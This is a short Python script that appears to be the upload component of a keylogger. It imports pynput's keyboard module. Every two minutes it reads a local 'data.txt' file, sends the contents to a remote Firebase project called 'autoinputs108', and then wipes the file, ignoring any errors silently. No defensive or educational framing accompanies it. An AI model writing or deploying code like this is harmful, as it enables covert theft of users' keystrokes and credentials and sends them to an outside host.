from pynput import keyboard




file_path='data.txt'

import time
import datetime

em_str=''
minute=0
while True:


	try:
		from req_module import *
		db=Request_Firebase(project_id='autoinputs108')
	except:
		pass
	date_txt1=datetime.datetime.now()
	date_txt1=str(date_txt1)
	date_txt2=date_txt1.split('.')
	new_txt=date_txt2[0].replace(':','_')
	new_txt=new_txt[:-1]
	new_txt=new_txt[:-1]
	new_txt=new_txt[:-1]
	last_degs=int(new_txt[-2]+new_txt[-1])
	time.sleep(120)
	print(last_degs)
	#db.input_data(path='',data={new_txt: em_str})
	
	
	if last_degs%2==0:
		try:
			f1 = open("data.txt", "r")
			content = f1.read()
			db.input_data(path='',data={new_txt: content})
			f1.close()
			with open(file_path, 'w') as file: 
				file.write('')
				file.close()
		except:
			pass
	else:
		pass


	
